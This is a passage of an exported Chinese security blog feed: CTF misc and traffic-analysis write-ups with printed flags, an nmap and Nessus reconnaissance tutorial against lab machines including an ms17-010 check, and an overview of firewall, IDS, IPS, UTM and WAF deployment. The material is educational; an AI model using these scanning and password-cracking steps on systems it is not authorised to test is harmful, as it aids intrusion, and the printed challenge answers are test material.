src="https://github.com/southerose/PictureBed/raw/master/img/20210617182945.png"></p><h1 id="文件中秘密"><a href="#文件中秘密" class="headerlink" title="文件中秘密"></a>文件中秘密</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620093157.png"></p><h2 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h2><ul><li>发现图片属于中的隐藏信息</li></ul><h2 id="过程-9"><a href="#过程-9" class="headerlink" title="过程"></a>过程</h2><p>解压附件得到一张图片，属性里面得到flag</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210617201627.png"></p><h1 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620093204.png"></p><h2 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h2><ul><li>wireshark抓包分析</li><li>wireshark分组字节流中搜索字符串</li></ul><h2 id="过程-10"><a href="#过程-10" class="headerlink" title="过程"></a>过程</h2><p>打开是个.pcap的流量包</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210617202635.png"></p><p>直接搜索flag，组合emai和password即可得到flag</p><h1 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620093211.png"></p><h2 id="知识点-11"><a href="#知识点-11" class="headerlink" title="知识点"></a>知识点</h2><ul><li>.rar文件使用archpr破解密码</li></ul><h2 id="过程-11"><a href="#过程-11" class="headerlink" title="过程"></a>过程</h2><p>解压附件，得到一个被加密了的.rar的压缩包，想办法破解，题目提示是四位密码，使用工具archpr</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210617203342.png"></p><p>得到密码后，打开文件得到flag</p><h1 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620093218.png"></p><h2 id="知识点-12"><a href="#知识点-12" class="headerlink" title="知识点"></a>知识点</h2><ul><li>工具QR Research的使用</li></ul><h2 id="过程-12"><a href="#过程-12" class="headerlink" title="过程"></a>过程</h2><p>使用QR Research得到flag</p><h1 id="ZIP伪加密"><a href="#ZIP伪加密" class="headerlink" title="ZIP伪加密"></a>ZIP伪加密</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620093225.png"></p><h2 id="知识点-13"><a href="#知识点-13" class="headerlink" title="知识点"></a>知识点</h2><ul><li><a href="https://blog.csdn.net/qq_26187985/article/details/83654197">zip伪加密</a></li></ul><h2 id="过程-13"><a href="#过程-13" class="headerlink" title="过程"></a>过程</h2><p>.zip文件被加密了，查询资料，给出两张图</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210617205233.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210617205335.png"></p><p>再看本题</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210617205900.png"></p><p>在标记处将09改成00，保存后解压得到flag</p><h1 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620093232.png"></p><h2 id="知识点-14"><a href="#知识点-14" class="headerlink" title="知识点"></a>知识点</h2><ul><li>binwalk分析文件</li><li>foremost提权文件</li><li>ziperello破解文件密码</li></ul><h2 id="过程-14"><a href="#过程-14" class="headerlink" title="过程"></a>过程</h2><p>打开附件仍然是一张图片，binwalk分析发现zip文件，foremost分离，发现.zip压缩文件被加密了，直接放到ziperello中暴力破解四位数字密码</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210618152402.png"></p><h1 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620093240.png"></p><h2 id="知识点-15"><a href="#知识点-15" class="headerlink" title="知识点"></a>知识点</h2><ul><li>stegsolve分析图片通道</li><li>stegsolve=&gt;Date Extract提取对应通道内容</li><li></li></ul><h2 id="过程-15"><a href="#过程-15" class="headerlink" title="过程"></a>过程</h2><p>red plane 0、green plane 0、blue plane 0通道被黑色遮挡，data extract</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210618154456.png"></p><p>发现flag</p><h1 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620093247.png"></p><h2 id="知识点-16"><a href="#知识点-16" class="headerlink" title="知识点"></a>知识点</h2><ul><li>wireshark中在分组字节流中搜索对于字符串</li></ul><h2 id="过程-16"><a href="#过程-16" class="headerlink" title="过程"></a>过程</h2><p>打开流量包直接搜索得到flag</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210618155035.png"></p><h1 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620093254.png"></p><h2 id="知识点-17"><a href="#知识点-17" class="headerlink" title="知识点"></a>知识点</h2><ul><li>.rar加密文件使用archpr破解</li></ul><h2 id="过程-17"><a href="#过程-17" class="headerlink" title="过程"></a>过程</h2><p>binwalk发现rar文件，然后使用foremost分离文件，打开archpr爆破四位纯数字密码</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210618160448.png"></p><h1 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620093300.png"></p><h2 id="知识点-18"><a href="#知识点-18" class="headerlink" title="知识点"></a>知识点</h2><ul><li>关注图片属性中的信息</li></ul><h2 id="过程-18"><a href="#过程-18" class="headerlink" title="过程"></a>过程</h2><p>打开附件，是一张图片，binwalk分析，发现.zip文件，foremost分离，发现存在密码，没给提示，先试试4纯数字，直接打开工具ziperello，1-8位纯数字都没爆破出，然后发现属性给了提示</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210618161201.png"></p><p>把这个当做密码得到flag</p><h1 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620093308.png"></p><h2 id="知识点-19"><a href="#知识点-19" class="headerlink" title="知识点"></a>知识点</h2><ul><li>关注每个数据包中隐藏的细节</li></ul><h2 id="过程-19"><a href="#过程-19" class="headerlink" title="过程"></a>过程</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210618161813.png"></p><p>打开流量包，发现目的地址为192.155.81.86的流量末尾依次出现flag385b87afc8671dee07550290d16a8071，添加{}即可得到flag</p><h1 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620093315.png"></p><h2 id="知识点-20"><a href="#知识点-20" class="headerlink" title="知识点"></a>知识点</h2><ul><li>关注二进制方式打开文件中隐藏的信息</li></ul><h2 id="过程-20"><a href="#过程-20" class="headerlink" title="过程"></a>过程</h2><p>打开图片，属性和binwalk没得到啥信息，二进制方式打开文件，发现一串二进制值</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210619185106.png"></p><p>八位为一个ascii，转换即可得到flag</p><pre class="line-numbers language-none"><code class="language-none">01101011 k01101111 o01100101 e01101011 k01101010 j00110011 301110011 s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag{koekj3s}</p><h1 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620093321.png"></p><h2 id="知识点-21"><a href="#知识点-21" class="headerlink" title="知识点"></a>知识点</h2><ul><li>关注二进制打开方式中隐藏的信息</li></ul><h2 id="过程-21"><a href="#过程-21" class="headerlink" title="过程"></a>过程</h2><p>打开图片，用binwalk分析，发现里面还有一张图片，但是无法利用，就第一张照片用winhex打开搜索即可得到flag</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210619190500.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210619190635.png"></p><p>LSB隐写，我们发现是个zip文件，然后保存为xx.zip</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210619192330.png"></p><p>解压之后发现一个ELF文件</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210619192426.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210619192532.png"></p><p>赋予权限，直接执行即可</p><h1 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620100312.png"></p><h2 id="知识点-22"><a href="#知识点-22" class="headerlink" title="知识点"></a>知识点</h2><ul><li>关注图片本身隐藏的信息</li></ul><h2 id="过程-22"><a href="#过程-22" class="headerlink" title="过程"></a>过程</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620100337.png"></p><p>打开附件，发现两个文件，一个加密的.zip文件，是上方的一张图片。容易发现张图片下方的部分，是盲文，根据盲文解出的密文，很有可能是对应压缩文件的密码</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620100550.png"></p><p>查表可得，密文：kmdonowg，解压文件成功，得到一个 .wav音频文件，然后听出是莫斯密码，使用audacity打开</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620100933.png"></p><p>flag{wpei08732?23dz}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> misc </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub-misc-wp</title>
      <link href="2021/06/20/ctfhub-misc-wp/"/>
      <url>2021/06/20/ctfhub-misc-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="数据库流量"><a href="#数据库流量" class="headerlink" title="数据库流量"></a>数据库流量</h1><h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>wireshark的过滤搜索功能</li><li>mysql的登陆过程</li></ul><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210613100020.png"></p><p>直接搜索字符串ctfhub得到flag</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210613100145.png"></p><p>过滤协议mysql</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210613100225.png"></p><p>得到所以mysql协议的流量包</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210613100446.png"></p><p>然后开始执行sql语句开始查询</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210613101915.png"></p><h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>搜索分组字节流</li></ul><h3 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h3><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210613102421.png"></p><p>使用分组字节流，搜索ctfhub</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210613102421.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210613102715.png"></p><p>得到第一段flag</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210613102749.png"></p><p>得到第二段flag</p><pre class="line-numbers language-none"><code class="language-none">ctfhub{6051d6123de43dfad7609804925c0121}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul><li>搜索十六进制值</li></ul><h3 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h3><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210613104745.png"></p><p><img src="C:/Users/Polaris/AppData/Roaming/Typora/typora-user-images/image-20210613104818317.png" alt="image-20210613104818317"></p><h1 id="协议流量分析"><a href="#协议流量分析" class="headerlink" title="协议流量分析"></a>协议流量分析</h1><h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><h3 id="DATA"><a href="#DATA" class="headerlink" title="DATA"></a>DATA</h3><h4 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h4><ul><li>wireshark的流量过滤功能</li><li>wireshark分组字节流中隐藏的信息</li></ul><h4 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a>过程</h4><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210613163412.png"></p><p>先过滤icmp的流量包，我们</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210613163502.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210613163527.png"></p><p>把所有数据表连接起来，可以发现字符A后面连续出现ctfhub{c87eb99796406ac0b}</p><h3 id="Length"><a href="#Length" class="headerlink" title="Length"></a>Length</h3><h4 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h4><ul><li>wireshark数据包中的length隐藏信息</li></ul><h4 id="过程-4"><a href="#过程-4" class="headerlink" title="过程"></a>过程</h4><p>将所有ICMP数据包的Length字段取出来，转换为ASCII码值，即可得到flag</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210613164201.png"></p><p>9911610210411798123979998545357102485051125<br>ctfhub{acb659f023}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> wp </tag>
            
            <tag> ctfhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用nmap+nessus信息收集</title>
      <link href="2021/05/11/shi-yong-nmap-nessus-xin-xi-shou-ji/"/>
      <url>2021/05/11/shi-yong-nmap-nessus-xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><blockquote><p><strong>掌控信息，发现漏洞，便于渗透测试利用</strong></p></blockquote><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><pre class="line-numbers language-none"><code class="language-none"># 使用TCP扫描nmap -sP 192.168.140.0/24#使用ICMP协议pingnmap -sP 192.168.140.0/24  #使用ICMP协议pingnmap -PS 192.168.140.0/24 #使用SYN协议ping，不会在靶机log留下痕迹nmap -PA 192.168.140.0/24 #使用ACK协议pingnmap -PU 192.168.140.0/24 #使用UDP协议ping#Tips:除了扫描网段，也可扫描域名以及ip段<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210116202555320.png"></p><blockquote><p><strong>图为使用ICMP协议扫描截图↑</strong></p></blockquote><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><pre class="line-numbers language-none"><code class="language-none">nmap -sS 192.168.140.128   #使用SYN扫描win7开放端口nmap -sS 192.168.140.132   #使用SYN扫描winxp开放端口nmap -sT {ip}              #默认使用TCP扫描nmap -sT {ip} -p {port}    #使用TCP扫描，制定端口nmap -sA {ip}              #使用ACK扫描nmap -sU {ip}              #使用UDP扫描Tips:ip和port可以写成范围,如ip20-100，port 1-65535<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210116204014636.png"></p><blockquote><p><strong>图为使用SYN扫描win7的开放端口↑</strong></p></blockquote><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210116204130050.png"></p><blockquote><p><strong>图为使用SYN扫描winxp开放端口↑</strong></p></blockquote><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210116204459833.png"></p><blockquote><p><strong>图为使用SYN扫描winxp且指定端口为80↑</strong></p></blockquote><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210116205108469.png"></p><blockquote><p><strong>图为使用SYN扫描winxp且指定端口范围为50-300↑</strong></p></blockquote><h4 id="开放服务和操作系统检测"><a href="#开放服务和操作系统检测" class="headerlink" title="开放服务和操作系统检测"></a>开放服务和操作系统检测</h4><pre class="line-numbers language-none"><code class="language-none">nmap -sV 192.168.140.128    #探测winxp的开放服务nmap -sV 192.168.140.132    #探测win7的开放服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210116205848496.png"></p><blockquote><p><strong>图为使用-sv参数探测winxp的开放服务↑</strong></p></blockquote><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210116210146335.png"></p><blockquote><p><strong>图为使用-sv参数探测win7的开放服务↑</strong></p></blockquote><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210116210229282.png"></p><blockquote><p><strong>图为探测winxp的操作系统↑</strong></p></blockquote><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210116210247782.png"></p><blockquote><p><strong>图为探测win7的操作系统↑</strong></p></blockquote><p><img src="C:\Users\Polaris\AppData\Roaming\Typora\typora-user-images\image-20210116211443702.png" alt="image-20210116211443702"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210116211421518.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210116211539340.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210116211701977.png"></p><blockquote><p><strong>图为使用参数-A来检测winxp开放的服务版本与操作系统版本↑</strong></p></blockquote><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210116211107633.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210116211146381.png"></p><blockquote><p><strong>图为使用参数-A来检测win7开放的服务版本与操作系统版本↑</strong></p></blockquote><h4 id="脚本扫描"><a href="#脚本扫描" class="headerlink" title="脚本扫描"></a>脚本扫描</h4><pre class="line-numbers language-none"><code class="language-none">locate ms17-010 #查找要找的ms17-010的脚本文件nmap -sS {ip} --script={scirptname} #使用nmap脚本扫描win7是否存在ms17-010漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210116212243435.png"></p><blockquote><p><strong>图为使用脚本来检测win7是否存在ms17-010漏洞↑</strong></p></blockquote><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li><p>详见<a href="https://nmap.org/man/zh/">nmap官方教程</a></p></li><li><p>nmap思维导图</p></li></ul><p><img src="https://github.com/southerose/PictureBed/raw/master/img/nmap%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE.png"></p><h3 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h3><h4 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h4><blockquote><p>掌控信息，发现漏洞，便于渗透测试利用</p></blockquote><h4 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h4><pre class="line-numbers language-none"><code class="language-none">service nessusd start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="进入扫描界面"><a href="#进入扫描界面" class="headerlink" title="进入扫描界面"></a>进入扫描界面</h4><blockquote><p>端口：8334</p></blockquote><pre class="line-numbers language-none"><code class="language-none">https://127.0.0.1:8834<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210117211515002.png"></p><h4 id="使用高级扫描"><a href="#使用高级扫描" class="headerlink" title="使用高级扫描"></a>使用高级扫描</h4><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210117211427655.png"></p><blockquote><p>Tips：根据扫描的对象针对性开启扫描插件及其他服务，例如：扫描windows系统可以只开启扫描windows的插件，还可以指定扫描的端口等。</p></blockquote><h4 id="扫描win7"><a href="#扫描win7" class="headerlink" title="扫描win7"></a>扫描win7</h4><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210117211940346.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210117212000512.png"></p><h4 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h4><p><a href="https://blog.csdn.net/weixin_34396103/article/details/92189013">参考文档</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap </tag>
            
            <tag> nessus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>四大安全设备</title>
      <link href="2021/05/01/si-da-an-quan-she-bei/"/>
      <url>2021/05/01/si-da-an-quan-she-bei/</url>
      
        <content type="html"><![CDATA[<h2 id="1-基础防火墙FW-NGFW类"><a href="#1-基础防火墙FW-NGFW类" class="headerlink" title="1.基础防火墙FW/NGFW类"></a>1.基础防火墙FW/NGFW类</h2><p>主要是可实现基本包过滤策略的防火墙，这类是有硬件处理、软件处理等，其主要功能实现是限制对IP:port的访问。基本上的实现都是默认情况下关闭所有的通过型访问，只开放允许访问的策略。FW可以拦截低层攻击行为，但对应用层的深层攻击行为无能为力。   FW部署位置一般为外联出口或者区域性出口位置，对内外流量进行安全隔离。部署方式常见如下 ：</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/TB2pMSjcXXXXXcJXXXXXXXXXXXX_!!715264774.jpeg"></p><h2 id="2-IDS类"><a href="#2-IDS类" class="headerlink" title="2.IDS类"></a>2.IDS类</h2><p>此类产品基本上以旁路为主，特点是不阻断任何网络访问，主要以提供报告和事后监督为主，少量的类似产品还提供TCP阻断等功能，但少有使用。 </p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/TB2X1ufcXXXXXbPXpXXXXXXXXXX_!!715264774.png"></p><h2 id="3-IPS类"><a href="#3-IPS类" class="headerlink" title="3.IPS类"></a>3.IPS类</h2><p>解决了IDS无法阻断的问题，基本上以在线模式为主，系统提供多个端口，以透明模式工作。在一些传统防火墙的新产品中也提供了类似功能，其特点是可以分析到数据包的内容，解决传统防火墙只能工作在4层以下的问题。和IDS一样，IPS也要像防病毒系统定义N种已知的攻击模式，并主要通过模式匹配去阻断非法访问,致命缺点在于不能主动的学习攻击方式，对于模式库中不能识别出来的攻击，默认策略是允许 访问的！  IPS类设备，常被串接在主干路上，对内外网异常流量进行监控处理，部署位置常见如下 ：</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/TB2jfykcXXXXXcqXXXXXXXXXXXX_!!715264774.jpg"></p><h2 id="4-UTM类安全设备"><a href="#4-UTM类安全设备" class="headerlink" title="4.UTM类安全设备"></a>4.UTM类安全设备</h2><p>是以上三者的结合体，按照IDC提出“统一威胁管理”的概念来看，UTM是将防病毒、入侵检测和防火墙安全设备划归到一起“统一管理”的新类别。    IDC将防病毒、防火墙和入侵检测等概念融合到被称为统一威胁管理的新类别中，该概念引起了业界的广泛重视，并推动了以整合式安全设备为代表的市场细分的诞生。由IDC提出的UTM是指由硬件、软件和网络技术组成的具有专门用途的设备，它主要提供一项或多项安全功能，将多种安全特性集成于一个硬设备里，构成一个标准的统一管理平台。  由于性能要求出众，导致造价一般比较高，目前一般只有大型企业会有使用。  UTM的优点主要有以下几条  1.整合所带来的成本降低（一身兼多职嘛！）   2.降低信息安全工作强度 （减轻管理员负担）  3.降低技术复杂度  UTM也不能一劳永逸的解决所有安全问题，总结下来，有如下缺点  1.网关防御的弊端   网关防御在防范外部威胁的时候非常有效，但是在面对内部威胁的时候就无法发挥作用了。有很多资料表明造成组织信息资产损失的威胁大部分来自于组织内部，所以以网关型防御为主的UTM设备目前尚不是解决安全问题的万灵药。   2.过度集成带来的风险  3.性能和稳定性 </p><h2 id="5-主动安全类"><a href="#5-主动安全类" class="headerlink" title="5.主动安全类"></a>5.主动安全类</h2><p>和前面的产品均不同，主动安全产品的特点是协议针对性非常强，比如WAF就是专门负责HTTP协议的安全处理，DAF就是专门负责数据库Sql  查询类的安全处理。在主动安全产品中通常会处理到应用级的访问流程。对于不认识的业务访问全部隔离(以下以WAF为重点说明这一类安全设备)。   </p><p>WAF:Web应用防护系统（Web Application Firewall,  简称：WAF）代表了一类新兴的信息安全技术，用以解决诸如防火墙一类传统设备束手无策的Web应用安全问题。与传统防火墙不同，WAF工作在应用层，因此对Web应用防护具有先天的技术优势。基于对Web应用业务和逻辑的深刻理解，WAF对来自Web应用程序客户端的各类请求进行内容检测和验证，确保其安全性与合法性，对非法的请求予以实时阻断，从而对各类网站站点进行有效防护。  </p><h3 id="5-1-WAF部署位置"><a href="#5-1-WAF部署位置" class="headerlink" title="5.1 WAF部署位置"></a>5.1 WAF部署位置</h3><p>通常情况下，WAF放在企业对外提供网站服务的DMZ区域或者放在数据中心服务区域，也可以与防火墙或IPS等网关设备串联在一起（这种情况较少）。总之，决定WAF部署位置的是WEB服务器的位置。因为WEB服务器是WAF所保护的对象。部署时当然要使WAF尽量靠近WEB服务器。  </p><h3 id="5-2-WAF部署模式及优缺点"><a href="#5-2-WAF部署模式及优缺点" class="headerlink" title="5.2 WAF部署模式及优缺点"></a>5.2 WAF部署模式及优缺点</h3><p>  透明代理模式、反向代理模式、路由代理模式及端口镜像模式。前三种模式也被统称为在线模式，通常需要将WAF串行部署在WEB服务器前端，用于检测并阻断异常流量。端口镜像模式也称为离线模式，部署也相对简单，只需要将WAF旁路接在WEB服务器上游的交换机上，用于只检测异常流量。</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/TB2pJClcXXXXXaMXXXXXXXXXXXX_!!715264774.gif"></p><h4 id="部署模式1"><a href="#部署模式1" class="headerlink" title="部署模式1"></a>部署模式1</h4><p>透明代理模式（也称网桥代理模式）    透明代理模式的工作原理是，当WEB客户端对服务器有连接请求时，TCP连接请求被WAF截取和监控。WAF偷偷的代理了WEB客户端和服务器之间的会话，将会话分成了两段，并基于桥模式进行转发。从WEB客户端的角度看，WEB客户端仍然是直接访问服务器，感知不到WAF的存在；从WAF工作转发原理看和透明网桥转发一样，因而称之为透明代理模式，又称之为透明桥模式。    这种部署模式对网络的改动最小，可以实现零配置部署。另外通过WAF的硬件Bypass功能在设备出现故障或者掉电时可以不影响原有网络流量，只是WAF自身功能失效。缺点是网络的所有流量（HTTP和非HTTP）都经过WAF对WAF的处理性能有一定要求，采用该工作模式无法实现服务器负载均衡功能。  </p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/TB2rcajcXXXXXcSXXXXXXXXXXXX_!!715264774.png"> </p><h4 id="部署模式2"><a href="#部署模式2" class="headerlink" title="部署模式2"></a>部署模式2</h4><p>反向代理模式    反向代理模式是指将真实服务器的地址映射到反向代理服务器上。此时代理服务器对外就表现为一个真实服务器。由于客户端访问的就是WAF，因此在WAF无需像其它模式（如透明和路由代理模式）一样需要采用特殊处理去劫持客户端与服务器的会话然后为其做透明代理。当代理服务器收到HTTP的请求报文后，将该请求转发给其对应的真实服务器。后台服务器接收到请求后将响应先发送给WAF设备，由WAF设备再将应答发送给客户端。这个过程和前面介绍的透明代理其工作原理类似，唯一区别就是透明代理客户端发出的请求的目的地址就直接是后台的服务器，所以透明代理工作方式不需要在WAF上配置IP映射关系。    这种部署模式需要对网络进行改动，配置相对复杂，除了要配置WAF设备自身的地址和路由外，还需要在WAF上配置后台真实WEB服务器的地址和虚地址的映射关系。另外如果原来服务器地址就是全局地址的话（没经过NAT转换）那么通常还需要改变原有服务器的IP地址以及改变原有服务器的DNS解析地址。采用该模式的优点是可以在WAF上同时实现负载均衡。 </p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/TB2Bp9fcXXXXXaVXpXXXXXXXXXX_!!715264774.png">  </p><h4 id="部署模式3"><a href="#部署模式3" class="headerlink" title="部署模式3"></a>部署模式3</h4><p>路由代理模式  路由代理模式，它与网桥透明代理的唯一区别就是该代理工作在路由转发模式而非网桥模式，其它工作原理都一样。由于工作在路由（网关）模式因此需要为WAF的转发接口配置IP地址以及路由。  这种部署模式需要对网络进行简单改动，要设置该设备内网口和外网口的IP地址以及对应的路由。工作在路由代理模式时，可以直接作为WEB服务器的网关，但是存在单点故障问题，同时也要负责转发所有的流量。该种工作模式也不支持服务器负载均衡功能。 </p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/TB2T75kcXXXXXbUXXXXXXXXXXXX_!!715264774.png"></p><h4 id="部署模式4"><a href="#部署模式4" class="headerlink" title="部署模式4"></a>部署模式4</h4><p>端口镜像模式  端口镜像模式工作时，WAF只对HTTP流量进行监控和报警，不进行拦截阻断。该模式需要使用交换机的端口镜像功能，也就是将交换机端口上的HTTP流量镜像一份给WAF。对于WAF而言，流量只进不出。  这种部署模式不需要对网络进行改动，但是它仅对流量进行分析和告警记录，并不会对恶意的流量进行拦截和阻断，适合于刚开始部署WAF时，用于收集和了解服务器被访问和被攻击的信息，为后续在线部署提供优化配置参考。这种部署工作模式，对原有网络不会有任何影响。 </p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/TB2SValcXXXXXbOXXXXXXXXXXXX_!!715264774.gif">                                                                                                                       </p>]]></content>
      
      
      <categories>
          
          <category> 复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设备 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis的简单利用</title>
      <link href="2021/04/21/redis-de-jian-dan-li-yong/"/>
